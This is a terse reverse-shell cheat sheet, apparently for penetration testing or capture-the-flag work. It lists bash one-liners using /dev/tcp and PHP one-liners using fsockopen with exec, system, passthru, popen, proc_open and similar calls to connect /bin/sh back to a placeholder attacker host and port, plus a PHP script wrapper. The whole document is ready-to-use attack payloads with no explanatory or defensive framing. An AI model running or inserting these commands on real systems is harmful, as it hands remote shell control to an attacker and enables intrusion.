## bash:
    bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1

    0<&196;exec 196<>/dev/tcp/<LHOST>/<LPORT>; sh <&196 >&196 2>&196

    /bin/bash -l > /dev/tcp/<LHOST>/<LPORT> 0<&1 2>&1

## php:
    php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
    php -r '$sock=fsockopen("<LHOST>",<LPORT>);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
    php -r '$sock=fsockopen("<LHOST>",<LPORT>);`/bin/sh -i <&3 >&3 2>&3`;'
    php -r '$sock=fsockopen("<LHOST>",<LPORT>);system("/bin/sh -i <&3 >&3 2>&3");'
    php -r '$sock=fsockopen("<LHOST>",<LPORT>);passthru("/bin/sh -i <&3 >&3 2>&3");'
    php -r '$sock=fsockopen("<LHOST>",<LPORT>);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
    php -r '$sock=fsockopen("<LHOST>",<LPORT>);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

    Editor: <?php <SCRIPT> ?>